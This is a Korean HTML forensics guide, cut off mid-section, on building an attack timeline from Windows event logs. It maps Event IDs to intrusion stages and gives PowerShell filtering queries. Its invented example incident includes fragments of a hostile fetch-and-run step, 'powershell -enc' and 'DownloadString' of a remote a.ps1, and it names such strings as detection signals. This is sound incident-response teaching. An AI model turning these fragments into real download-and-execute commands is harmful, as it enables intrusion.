@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Event Log만으로 공격 타임라인 만들기: 침해 단계별 Event ID 지도 · FOR-0108 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=Event%20Log">Event Log</a> / FOR-0108
+      </div>
+      <header class="article-head">
+        <h1>Event Log만으로 공격 타임라인 만들기: 침해 단계별 Event ID 지도</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">Event Log</span>
+      <span class="badge badge-type">가이드</span>
+      <span class="badge badge-diff diff-basic">기본</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">windows</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>Event Log만으로 공격 타임라인을 만들 때는 최소 5종(4624·4625·4688·7045·1102)으로 시작해 얻은 값(계정·Logon ID·PID·IP)을 다음 단계의 필터로 쓰며 확장하고, 침해 단계별 Event ID 지도표를 따라가면 &quot;시간순 표 + 서술 문장&quot; 형태의 답이 기계적으로 완성된다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>EvtxECmd, Timeline Explorer, PowerShell, sqlite3</td></tr>
+<tr><th>artifact</th><td><code>Security.evtx</code> · <code>System.evtx</code> · <code>PowerShell/Operational</code> · <code>Sysmon/Operational</code> · <code>TerminalServices</code> · <code>EVTX</code></td></tr>
+<tr><th>파일 경로</th><td><code>C:\Windows\System32\winevt\Logs</code> · <code>C:\Windows\System32\winevt\Logs\Security.evtx</code> · <code>C:\Windows\System32\winevt\Logs\System.evtx</code></td></tr>
+<tr><th>프로토콜</th><td>RDP, SMB, NTLM, Kerberos</td></tr>
+<tr><th>로그 필드</th><td><code>TimeCreated</code> · <code>EventId</code> · <code>Channel</code> · <code>TargetUserName</code> · <code>TargetLogonId</code> · <code>SubjectLogonId</code> · <code>IpAddress</code> · <code>NewProcessName</code> · <code>CommandLine</code> · <code>ServiceName</code> · <code>ImagePath</code> · <code>ScriptBlockText</code></td></tr>
+<tr><th>파일 형식</th><td><code>evtx</code> · <code>csv</code></td></tr>
+<tr><th>검색 별칭</th><td>공격 타임라인 만들기 · 침해 흐름 정리 · 이벤트로그로 사건 재구성 · 무슨 일이 있었나 · 공격 단계별 이벤트 · event id 지도</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p>Event Log만으로 공격 타임라인을 만들 때는 <strong>최소 5종(4624·4625·4688·7045·1102)으로 시작해 얻은 값(계정·Logon ID·PID·IP)을 다음 단계의 필터로 쓰며 확장</strong>하고, 침해 단계별 Event ID 지도표를 따라가면 &quot;시간순 표 + 서술 문장&quot; 형태의 답이 기계적으로 완성된다.</p>
+<h2 id="어떤-문제에서-필요한가">어떤 문제에서 필요한가</h2>
+<ul><li>&quot;무슨 일이 일어났는지 시간순으로 서술하세요&quot; — 답이 값 하나가 아니라 사건 흐름인 문제</li><li>첨부가 EVTX뿐이고 디스크 이미지가 없는 문제</li><li>공격 단계 중 하나(예: 지속성 수단)를 물어보는데, 어느 Event ID를 봐야 하는지 모르는 문제</li><li>이벤트가 수만~수십만 건이라 어디서 시작할지 정해야 하는 문제</li></ul>
+<p>디스크 artifact를 같은 축에 얹는 것은 <a href="./ntfs-artifact-timeline.html">FOR-0050</a>의 몫이다. <strong>이 글은 EVTX 안에서 끝까지 가는 방법</strong>이고, 로그가 없는 구간을 디스크로 메우는 것은 FOR-0109로 넘긴다.</p>
+<h2 id="문제에서-처음-볼-단서">문제에서 처음 볼 단서</h2>
+<ol><li>첨부에 어느 채널이 있는가 — Security만이면 4624/4625/4688/1102, System이 있으면 7045가 추가된다</li><li>PowerShell/Operational이 있는가 → 4104가 사실상 정답 창고다</li><li>Sysmon 채널이 있는가 → 실행·네트워크·파일이 전부 잡힌다. 이 경우 Sysmon부터 본다</li><li>TerminalServices 채널이 있는가 → RDP 문제다. 1149와 21/24/25</li><li>지문에 시각이 하나 주어졌는가 → 그 시각 ±10분으로 먼저 좁힌다. <strong>KST인지 UTC인지 확인</strong></li></ol>
+<h2 id="30초-절차">30초 절차</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf all.csv --inc 4624,4688,7045,1102</code></pre></div>
+<p>이 네 개만으로 골격이 나온다. 그다음 이벤트 분포를 본다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">Import-Csv &#39;C:\case\out\all.csv&#39; |
+  Group-Object Channel, EventId | Sort-Object Count -Descending |
+  Select-Object -First 25 Name, Count | Format-Table -AutoSize</code></pre></div>
+<p>여기서 &quot;있으면 안 되는 이벤트&quot;를 먼저 찾는다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 존재 자체가 사건인 이벤트들
+Import-Csv &#39;C:\case\out\all.csv&#39; |
+  Where-Object { $_.EventId -in 1102,104,4719,1100,7045,4697,4720,4732,4698 } |
+  Sort-Object { [datetime]$_.TimeCreated } |
+  Format-Table TimeCreated, Channel, EventId, UserName, MapDescription -AutoSize</code></pre></div>
+<h2 id="상세-절차">상세 절차</h2>
+<h3 id="1단계-침해-단계별-event-id-지도">1단계 — 침해 단계별 Event ID 지도</h3>
+<p>이 표가 이 글의 본체다. 단계마다 <strong>&quot;무엇을 얻는가&quot;</strong> 열이 다음 단계의 필터가 된다.</p>
+<div class="table-wrap"><table><thead><tr><th>단계</th><th>Event ID</th><th>채널</th><th>여기서 얻는 값</th></tr></thead><tbody><tr><td><strong>초기 접근</strong></td><td>4625 (실패 로그온)</td><td>Security</td><td>공격 시작 시각, 시도 계정 목록, 원본 IP</td></tr><tr><td></td><td>4624 (성공 로그온)</td><td>Security</td><td>성공 계정, <code>TargetLogonId</code>, <code>LogonType</code>, IP</td></tr><tr><td></td><td>1149 (RDP 인증 성공)</td><td>TerminalServices-RemoteConnectionManager/Operational</td><td><code>Param3</code> = 원본 주소</td></tr><tr><td></td><td>4648 (명시적 자격증명)</td><td>Security</td><td>발신 측 흔적, <code>TargetServerName</code></td></tr><tr><td><strong>실행</strong></td><td>4688 (프로세스 생성)</td><td>Security</td><td><code>NewProcessName</code>, <code>CommandLine</code>, PID, <code>SubjectLogonId</code></td></tr><tr><td></td><td>4104 (스크립트 블록)</td><td>PowerShell/Operational</td><td><strong>스크립트 본문 전체</strong> (<code>ScriptBlockText</code>)</td></tr><tr><td></td><td>4103 (모듈/파이프라인)</td><td>PowerShell/Operational</td><td><code>ContextInfo</code> 의 Host Application = 실행 명령행</td></tr><tr><td></td><td>Sysmon 1 (프로세스 생성)</td><td>Sysmon/Operational</td><td><code>Image</code>, <code>CommandLine</code>, <code>ProcessGuid</code>, 해시</td></tr><tr><td><strong>지속성</strong></td><td>7045 (서비스 설치)</td><td>System</td><td><code>ServiceName</code>, <code>ImagePath</code>, <code>AccountName</code></td></tr><tr><td></td><td>4697 (서비스 설치)</td><td>Security</td><td><code>ServiceName</code>, <code>ServiceFileName</code></td></tr><tr><td></td><td>4698 (작업 등록)</td><td>Security</td><td><code>TaskName</code>, <code>TaskContent</code>(XML 전체)</td></tr><tr><td></td><td>Sysmon 13 (레지스트리 값 설정)</td><td>Sysmon/Operational</td><td><code>TargetObject</code>, <code>Details</code> — Run 키 등</td></tr><tr><td></td><td>4720 (계정 생성)</td><td>Security</td><td>새 계정 이름, <code>TargetSid</code></td></tr><tr><td></td><td>4732 (그룹 멤버 추가)</td><td>Security</td><td><code>MemberSid</code>, 대상 그룹 이름</td></tr><tr><td><strong>권한 상승</strong></td><td>4672 (특수 권한 부여)</td><td>Security</td><td><code>SubjectLogonId</code>, <code>PrivilegeList</code></td></tr><tr><td></td><td>4673 (특권 서비스 호출)</td><td>Security</td><td><code>PrivilegeList</code>, <code>ProcessName</code></td></tr><tr><td></td><td>4674 (특권 객체 조작)</td><td>Security</td><td><code>ObjectName</code>, <code>PrivilegeList</code></td></tr><tr><td><strong>자격증명 접근</strong></td><td>4672 with <code>SeDebugPrivilege</code></td><td>Security</td><td>메모리 접근 권한 획득 시점</td></tr><tr><td></td><td>4776 (NTLM 검증)</td><td>Security</td><td>계정, <code>Workstation</code>, <code>Status</code></td></tr><tr><td></td><td>4768 / 4769 (Kerberos 티켓)</td><td>Security</td><td><code>TargetUserName</code>, <code>ServiceName</code>, 암호화 타입</td></tr><tr><td><strong>측면 이동</strong></td><td>4624 <code>LogonType</code> = 3</td><td>Security</td><td>원격 접근 원본 IP</td></tr><tr><td></td><td>5140 / 5145 (공유 접근)</td><td>Security</td><td><code>ShareName</code>, <code>RelativeTargetName</code></td></tr><tr><td></td><td>4648 (명시적 자격증명)</td><td>Security</td><td>다음 목적지(<code>TargetServerName</code>)</td></tr><tr><td></td><td>7045 (원격 서비스 설치)</td><td>System</td><td>원격 실행 도구의 흔적</td></tr><tr><td><strong>수집 / 반출</strong></td><td>5145 (공유 파일 접근)</td><td>Security</td><td>어떤 파일을 읽었나</td></tr><tr><td></td><td>Sysmon 3 (네트워크 연결)</td><td>Sysmon/Operational</td><td><code>DestinationIp</code>, <code>DestinationPort</code>, <code>Image</code></td></tr><tr><td></td><td>Sysmon 11 (파일 생성)</td><td>Sysmon/Operational</td><td><code>TargetFilename</code> — 압축 파일 생성</td></tr><tr><td><strong>흔적 제거</strong></td><td>1102 (감사 로그 지움)</td><td>Security</td><td>지운 시각, 지운 계정</td></tr><tr><td></td><td>104 (로그 파일 지움)</td><td>System</td><td>어느 채널을 지웠나</td></tr><tr><td></td><td>4719 (감사 정책 변경)</td><td>Security</td><td>어떤 감사를 껐나</td></tr><tr><td></td><td>1100 (로깅 서비스 종료)</td><td>Security</td><td>로그가 끊긴 이유</td></tr><tr><td></td><td>Sysmon 23 (파일 삭제)</td><td>Sysmon/Operational</td><td><code>TargetFilename</code>, 보관된 사본</td></tr></tbody></table></div>
+<h3 id="2단계-최소-필요-이벤트로-시작한다">2단계 — 최소 필요 이벤트로 시작한다</h3>
+<p><strong>처음부터 전부 보면 실패한다.</strong> 다음 순서로 확장한다.</p>
+<div class="table-wrap"><table><thead><tr><th>라운드</th><th>뽑는 이벤트</th><th>목적</th><th>이 라운드가 끝나면</th></tr></thead><tbody><tr><td>1</td><td>4624, 4625, 4688, 7045, 1102</td><td>골격</td><td>공격 계정·IP·시작 시각·지속성 유무</td></tr><tr><td>2</td><td>+ 4672, 4634, 4648, 4720, 4732</td><td>권한과 계정 조작</td><td>권한 상승 시점, 만들어진 계정</td></tr><tr><td>3</td><td>+ 4104, 4103, Sysmon 1</td><td>실제 명령</td><td>무엇을 실행했나</td></tr><tr><td>4</td><td>+ 5140, 5145, Sysmon 3/11</td><td>수집·반출</td><td>어떤 파일이 어디로</td></tr><tr><td>5</td><td>+ 4698, Sysmon 13, 4697</td><td>지속성 상세</td><td>재부팅 후에도 살아남는 수단</td></tr><tr><td>6</td><td>+ 104, 4719, 1100, Sysmon 23</td><td>은폐</td><td>로그 공백의 원인</td></tr></tbody></table></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 라운드 1
+EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf r1.csv --inc 4624,4625,4688,7045,1102
+
+# 라운드 3 (실행 상세)
+EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf r3.csv --inc 4104,4103,1</code></pre></div>
+<p><strong>gap 판정이나 &quot;없음&quot;을 근거로 쓸 때는 필터 없는 전체 CSV를 따로 뽑는다.</strong> <code>--inc</code> CSV는 번호가 당연히 빈다.</p>
+<h3 id="3단계-값을-다음-단계-필터로-넘기는-흐름">3단계 — 값을 다음 단계 필터로 넘기는 흐름</h3>
+<p>이것이 pivot의 실체다. 한 단계에서 얻은 값이 다음 단계의 <code>Where-Object</code> 조건이 된다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">4625 집계
+  -&gt; 시도 계정 목록, 원본 IP, 공격 시작 시각
+       |
+       v  (IP 로 필터)
+4624 (같은 IP, 성공)
+  -&gt; TargetUserName, TargetLogonId, LogonType
+       |
+       v  (TargetLogonId 로 필터)
+4672 / 4688 / 5145 (SubjectLogonId 일치)
+  -&gt; CommandLine, PID, 접근 파일
+       |
+       v  (PID / 프로세스 이름으로 필터)
+4104 / Sysmon 1 / Sysmon 3
+  -&gt; 스크립트 본문, 통신 대상
+       |
+       v  (시각 창으로 필터)
+7045 / 4698 / Sysmon 13
+  -&gt; 지속성 수단
+       |
+       v
+1102 / 104 / 4719
+  -&gt; 은폐 시점 = 타임라인의 끝</code></pre></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$csv = Import-Csv &#39;C:\case\out\all.csv&#39;
+
+# (1) 4625 집계 -&gt; 공격 시작 시각과 IP
+$csv | Where-Object { $_.EventId -eq 4625 } |
+  ForEach-Object {
+    $i = if ($_.Payload -match &#39;&quot;IpAddress&quot;:\s*&quot;([^&quot;]*)&quot;&#39;) { $Matches[1] } else { &#39;&#39; }
+    $u = if ($_.Payload -match &#39;&quot;TargetUserName&quot;:\s*&quot;([^&quot;]*)&quot;&#39;) { $Matches[1] } else { &#39;&#39; }
+    [pscustomobject]@{ Ip = $i; User = $u; TimeUTC = $_.TimeCreated }
+  } | Group-Object Ip | Sort-Object Count -Descending |
+  ForEach-Object {
+    $g = $_.Group | Sort-Object TimeUTC
+    [pscustomobject]@{
+      Ip = $_.Name; Fails = $_.Count
+      First = $g[0].TimeUTC; Last = $g[-1].TimeUTC
+      Users = (($g.User | Sort-Object -Unique) -join &#39;,&#39;)
+    }
+  } | Format-Table -AutoSize
+
+# (2) 그 IP 의 성공 로그온 -&gt; Logon ID
+$ip = &#39;203.0.113.77&#39;
+$csv | Where-Object { $_.EventId -eq 4624 -and $_.Payload -match [regex]::Escape($ip) } |
+  Select-Object TimeCreated, EventRecordId, Payload | Format-List
+
+# (3) 그 Logon ID 의 활동
+$lid = &#39;0x1a2b3c&#39;
+$csv | Where-Object { $_.Payload -match $lid } |
+  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={[int64]$_.EventRecordId}} |
+  Format-Table TimeCreated, Channel, EventId, MapDescription -AutoSize</code></pre></div>
+<p>각 단계의 상세 조인 절차는 세션은 FOR-0104, PID는 FOR-0105, IP/계정/단말은 FOR-0106에 있다.</p>
+<h3 id="4단계-노이즈-제거">4단계 — 노이즈 제거</h3>
+<div class="table-wrap"><table><thead><tr><th>버릴 대상</th><th>조건</th></tr></thead><tbody><tr><td>컴퓨터 계정</td><td><code>TargetUserName</code> 이 <code>$</code> 로 끝난다</td></tr><tr><td>시스템 세션</td><td>Logon ID <code>0x3e7</code> / <code>0x3e5</code> / <code>0x3e4</code></td></tr><tr><td>서비스·배치 로그온</td><td><code>LogonType</code> 4 / 5 (별도로 볼 때만 본다)</td></tr><tr><td><code>UMFD-*</code>, <code>DWM-*</code></td><td>데스크톱 관리자 세션</td></tr><tr><td>정상 상주 프로세스</td><td><code>svchost.exe</code>, <code>taskhostw.exe</code> 등의 4688 (단, <strong>경로가 정상인 것만</strong>)</td></tr><tr><td>반복 감사 노이즈</td><td>5379(자격증명 관리자 읽기), 4798(로컬 그룹 열거) 등</td></tr></tbody></table></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$clean = $csv | Where-Object {
+  $_.Payload -notmatch &#39;&quot;TargetUserName&quot;:\s*&quot;[^&quot;]*\$&quot;&#39; -and
+  $_.Payload -notmatch &#39;0x3e7|0x3e5|0x3e4&#39; -and
+  $_.UserName -notmatch &#39;^UMFD-|^DWM-|ANONYMOUS&#39;
+}
+&#39;{0} -&gt; {1} rows&#39; -f $csv.Count, $clean.Count</code></pre></div>
+<p>노이즈 제거로 보통 <strong>10분의 1 이하</strong>로 줄어든다. 줄지 않으면 필터가 payload 표기와 안 맞는 것이다.</p>
+<h3 id="5단계-단계별로-하나씩-확정">5단계 — 단계별로 하나씩 확정</h3>
+<p>각 단계는 &quot;찾았다&quot;로 끝내지 않고 <strong>확증 조건</strong>을 만족해야 타임라인에 올린다.</p>
+<div class="table-wrap"><table><thead><tr><th>단계</th><th>최소 확증 조건</th></tr></thead><tbody><tr><td>초기 접근</td><td>4625 누적 + 그 IP의 4624 성공. 실패 없이 성공만 있으면 &quot;유효 자격증명 보유&quot;로 서술</td></tr><tr><td>실행</td><td>4688의 <code>CommandLine</code> 또는 4104의 본문. 이름만으로는 부족</td></tr><tr><td>권한 상승</td><td>4672의 <code>PrivilegeList</code> 에 <code>SeDebugPrivilege</code>/<code>SeTakeOwnershipPrivilege</code> 등이 실제로 있는지</td></tr><tr><td>지속성</td><td>7045/4697의 <code>ImagePath</code>/<code>ServiceFileName</code> 이 비정상 경로 또는 인라인 명령</td></tr><tr><td>측면 이동</td><td>출발 호스트의 4648 또는 목적지의 4624 Type 3 + 같은 계정</td></tr><tr><td>반출</td><td>Sysmon 3의 외부 <code>DestinationIp</code> 또는 5145의 대량 파일 접근</td></tr><tr><td>흔적 제거</td><td>1102/104의 시각 + 그 이후 로그 공백의 대비</td></tr></tbody></table></div>
+<h3 id="6단계-결과를-시간순-표로-정리">6단계 — 결과를 시간순 표로 정리</h3>
+<p>제출 형식은 <strong>표 + 서술 문장</strong> 두 벌이다. 표만 내면 &quot;그래서 무슨 일이 있었나&quot;가 안 보이고, 문장만 내면 근거가 안 보인다.</p>
+<p>표 템플릿:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">| 시각(KST) | 시각(UTC) | 단계 | Event ID | 채널 | 계정 | 내용 | 근거(RecordId) |</code></pre></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 확정된 이벤트만 골라 표로 내보낸다
+$picked = @(1184402,1184571,1184572,1184573,1184574,1184880,1185004,1185204)
+
+$csv | Where-Object { [int64]$_.EventRecordId -in $picked } |
+  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={[int64]$_.EventRecordId}} |
+  Select-Object @{n=&#39;KST&#39;;e={ ([datetime]$_.TimeCreated).AddHours(9).ToString(&#39;yyyy-MM-dd HH:mm:ss&#39;) }},
+                @{n=&#39;UTC&#39;;e={ $_.TimeCreated }},
+                Channel, EventId,
+                @{n=&#39;RecId&#39;;e={ $_.EventRecordId }},
+                UserName, MapDescription |
+  Export-Csv -NoTypeInformation -Encoding UTF8 &#39;C:\case\out\attack_timeline.csv&#39;</code></pre></div>
+<p>완성 예시:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">| 시각(KST)            | UTC        | 단계      | ID   | 채널      | 계정       | 내용                          | RecId   |
+| 2026-03-14 16:11:02 | 07:11:02Z  | 초기접근  | 4625 | Security  | svc_backup | 실패 214건 시작 (203.0.113.77) | 1184188 |
+| 2026-03-14 16:19:02 | 07:19:02Z  | 초기접근  | 4624 | Security  | svc_backup | RDP 성공 Type 10, 0x1a2b3c    | 1184571 |
+| 2026-03-14 16:19:02 | 07:19:02Z  | 권한상승  | 4672 | Security  | svc_backup | SeDebugPrivilege 포함         | 1184572 |
+| 2026-03-14 16:20:08 | 07:20:08Z  | 실행      | 4688 | Security  | svc_backup | powershell.exe -enc ...       | 1184574 |
+| 2026-03-14 16:20:09 | 07:20:09Z  | 실행      | 4104 | PowerShell| svc_backup | DownloadString(http://.../a.ps1) | 1188  |
+| 2026-03-14 16:28:33 | 07:28:33Z  | 지속성    | 7045 | System    | svc_backup | WinUpdateSvc, ImagePath 비정상 | 8842   |
+| 2026-03-14 16:31:44 | 07:31:44Z  | 수집      | 5145 | Security  | svc_backup | C$ Users\Public\out.7z        | 1184880 |
+| 2026-03-14 16:45:11 | 07:45:11Z  | 흔적제거  | 1102 | Security  | svc_backup | 감사 로그 지움 (마지막 레코드) | 1185204 |</code></pre></div>
+<p>서술 템플릿:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">2026-03-14 16:11 KST 부터 203.0.113.77 에서 svc_backup 계정에 대한
+로그온 실패가 214건 누적되었고(4625), 16:19:02 에 Logon Type 10(RDP)으로
+성공했다(4624, RecId 1184571, LogonId 0x1a2b3c).
+같은 초에 4672 가 기록되어 SeDebugPrivilege 를 포함한 특수 권한이
+그 세션에 부여되었다(RecId 1184572).
+
+16:20:08 에 같은 세션에서 powershell.exe 가 인코딩된 명령으로 실행되었고
+(4688, RecId 1184574), 1초 뒤 PowerShell/Operational 4104 에
+http://203.0.113.77/a.ps1 을 받아 실행하는 본문이 남았다.
+
+16:28:33 에 WinUpdateSvc 라는 서비스가 설치되어(7045) 지속성이 확보되었다.
+16:31:44 에 C$ 공유를 통해 Users\Public\out.7z 가 접근되었다(5145).
+16:45:11 에 감사 로그가 지워졌고(1102, RecId 1185204) 이 레코드가
+Security 채널의 마지막 레코드이므로, 그 이후 구간은 관측되지 않는다.</code></pre></div>
+<p><strong>문장마다 Event ID와 <code>RecordId</code> 를 붙인다.</strong> 이것이 있으면 채점자가 검증할 수 있고, 자기 검산도 된다.</p>
+<h3 id="7단계-시간대-처리">7단계 — 시간대 처리</h3>
+<p><strong>EVTX <code>System/TimeCreated/@SystemTime</code> 은 UTC다.</strong> EvtxECmd CSV도 UTC로 출력하고, Event Viewer만 로컬 시간대로 변환해 보여준다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">KST = UTC + 9시간</code></pre></div>
+<ul><li>축은 UTC 하나로 고정한다</li><li>지문의 시각이 KST면 <strong>−9시간해서 UTC로 바꿔 필터</strong>한다</li><li>답을 낼 때만 +9시간해서 KST를 병기한다</li></ul>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 지문의 &quot;KST 16:00~17:00&quot; 구간 = UTC 07:00~08:00
+$csv | Where-Object {
+  ([datetime]$_.TimeCreated) -ge [datetime]&#39;2026-03-14T07:00:00Z&#39; -and
+  ([datetime]$_.TimeCreated) -le [datetime]&#39;2026-03-14T08:00:00Z&#39;
+}</code></pre></div>
+<h2 id="출력-필드-해석">출력 필드 해석</h2>
+<div class="table-wrap"><table><thead><tr><th>단계</th><th>결정적 필드</th><th>왜 결정적인가</th></tr></thead><tbody><tr><td>초기 접근</td><td>4625 <code>Status</code>/<code>SubStatus</code>, <code>IpAddress</code></td><td>계정 없음 vs 비밀번호 오류를 구분해 공격 방식을 판정</td></tr><tr><td>초기 접근</td><td>4624 <code>LogonType</code>, <code>TargetLogonId</code></td><td>접속 방식과 이후 모든 조인의 키</td></tr><tr><td>실행</td><td>4688 <code>CommandLine</code></td><td>인자 없이는 무엇을 했는지 알 수 없다</td></tr><tr><td>실행</td><td>4104 <code>ScriptBlockText</code></td><td>난독화된 명령의 본문</td></tr><tr><td>실행</td><td>4103 <code>ContextInfo</code></td><td><code>CommandLine</code> 이 비었을 때의 우회 경로</td></tr><tr><td>지속성</td><td>7045 <code>ImagePath</code></td><td><code>cmd /c</code>, <code>powershell -enc</code> 가 들어 있으면 확정적 악성</td></tr><tr><td>지속성</td><td>4698 <code>TaskContent</code></td><td>작업 XML 전체 — 실행 명령과 트리거가 그대로</td></tr><tr><td>권한 상승</td><td>4672 <code>PrivilegeList</code></td><td><code>SeDebugPrivilege</code> 는 메모리 접근 준비 신호</td></tr><tr><td>측면 이동</td><td>4648 <code>TargetServerName</code></td><td><strong>발신 측</strong> 기록이므로 경로의 방향을 정한다</td></tr><tr><td>반출</td><td>Sysmon 3 <code>DestinationIp</code>/<code>DestinationPort</code></td><td>실제 통신 대상</td></tr><tr><td>흔적 제거</td><td>1102 <code>SubjectUserName</code></td><td>지운 계정 = 공격자 세션과 대조</td></tr></tbody></table></div>
+<h2 id="pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>여기서 얻은 것</th><th>다음 목표</th><th>무엇을 확인하나</th></tr></thead><tbody><tr><td>공격 시작 시각</td><td><code>$MFT</code> / <code>$J</code> (<a href="./ntfs-artifact-timeline.html">FOR-0050</a>)</td><td>그 시각의 파일 생성·삭제</td></tr><tr><td><code>CommandLine</code> 이 비어 있음</td><td>4103 <code>ContextInfo</code>, Sysmon 1</td><td>명령행 우회 확보</td></tr><tr><td>7045 <code>ImagePath</code> 의 경로</td><td><code>$MFT</code> 그 파일의 생성 시각</td><td>언제 심어졌나</td></tr><tr><td>4104의 Base64</td><td>디코딩 → URL/IP</td><td>통신 대상</td></tr><tr><td>반출 대상 IP</td><td>pcap (<a href="./wireshark-30sec-triage.html">FOR-0146</a>)</td><td>실제 전송량과 내용</td></tr><tr><td>1102 시각 이후 공백</td><td>다른 채널·디스크 artifact (FOR-0109)</td><td>지워진 구간을 메운다</td></tr><tr><td>4720으로 만든 계정</td><td>SAM hive, ProfileList</td><td>계정 생성 시각과 프로필</td></tr><tr><td>로그온 세션</td><td>UserAssist / Prefetch (<a href="./userassist.html">FOR-0061</a>)</td><td>GUI 실행 흔적</td></tr></tbody></table></div>
+<h2 id="흔한-함정">흔한 함정</h2>
+<ul><li><strong>전체 이벤트를 한 번에 보려는 것.</strong> 수만~수십만 건이다. → 라운드 1의 5종으로 골격을 먼저 만든다.</li><li><strong>이벤트가 없는 것을 &quot;일어나지 않았다&quot;로 읽는 것.</strong> 4688·4104·5145는 기본으로 꺼져 있는 경우가 많다. → 없음의 해석은 FOR-0109 절차를 따른다.</li><li><strong>1102를 타임라인의 끝으로만 보고 넘기는 것.</strong> 1102가 마지막 레코드라면 그 이후 구간이 통째로 소실됐다는 뜻이다. → 소실 구간의 길이를 계산해 서술에 넣는다.</li><li><strong>같은 초 순서를 시각으로 정하는 것.</strong> 4624와 4672가 같은 초에 있으면 인과가 뒤집혀 보인다. → 채널 안에서 <code>EventRecordId</code> 로 정렬한다 (FOR-0103).</li><li><strong>채널이 다른 두 이벤트를 <code>EventRecordId</code> 로 비교하는 것.</strong> 번호는 채널별 독립이다. → 시각과 인과로 정한다.</li><li><strong>KST 지문을 UTC 필터에 그대로 넣는 것.</strong> 9시간 어긋난 구간을 뒤진다. → 지문 KST − 9시간 = 필터할 UTC.</li><li><strong><code>LogonType</code> 3을 무조건 측면 이동으로 읽는 것.</strong> 그룹 정책 적용·파일 공유 등 정상 트래픽이 대부분이다. → 계정·IP의 정상 기준선과 비교한다.</li><li><strong>4672를 무조건 권한 상승으로 읽는 것.</strong> 관리자 계정이 로그온하면 정상적으로 발생한다. → <code>PrivilegeList</code> 의 내용과 계정의 정상 패턴을 본다.</li><li><strong>7045만 보고 지속성을 확정하는 것.</strong> 정상 소프트웨어 설치도 7045를 남긴다. → <code>ImagePath</code> 가 비정상 경로인지, 인라인 명령인지 본다.</li><li><strong>표만 제출하는 것.</strong> 채점자는 &quot;무슨 일이 있었나&quot;를 읽고 싶어한다. → 표 + 서술 문장 두 벌을 낸다.</li><li><strong>근거 없이 서술하는 것.</strong> 문장에 Event ID와 <code>RecordId</code> 가 없으면 검증 불가다. → 모든 문장에 근거를 붙인다.</li><li><strong>한 단계를 못 찾으면 멈추는 것.</strong> 지속성이 없는 공격도 있고, 로그가 지워져 안 보일 수도 있다. → &quot;관측되지 않음&quot;과 &quot;일어나지 않음&quot;을 구분해 서술한다.</li></ul>
+<h2 id="교차검증">교차검증</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 1) 4625 폭주 구간과 4624 성공 시각이 이어지는가
+$csv | Where-Object { $_.EventId -in 4625,4624 } |
+  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={[int64]$_.EventRecordId}} |
+  Select-Object TimeCreated, EventId, UserName | Format-Table -AutoSize
+
+# 2) 4688 의 실행과 4104 의 본문이 같은 시각대인가
+$csv | Where-Object { $_.EventId -eq 4688 -and $_.Payload -match &#39;powershell&#39; } |
+  Select-Object TimeCreated, EventRecordId
+$csv | Where-Object { $_.EventId -eq 4104 } |
+  Select-Object TimeCreated, EventRecordId
+
+# 3) 7045 의 서비스가 이후 실제로 실행됐는가 (4624 Type 5 또는 4688)
+$csv | Where-Object { $_.EventId -eq 7045 } | Select-Object TimeCreated, Payload | Format-List
+$csv | Where-Object { $_.Payload -match &#39;&quot;LogonType&quot;:\s*&quot;?5&#39; } | Select-Object TimeCreated, UserName
+
+# 4) 1102 이후 그 채널에 이벤트가 남아 있는가
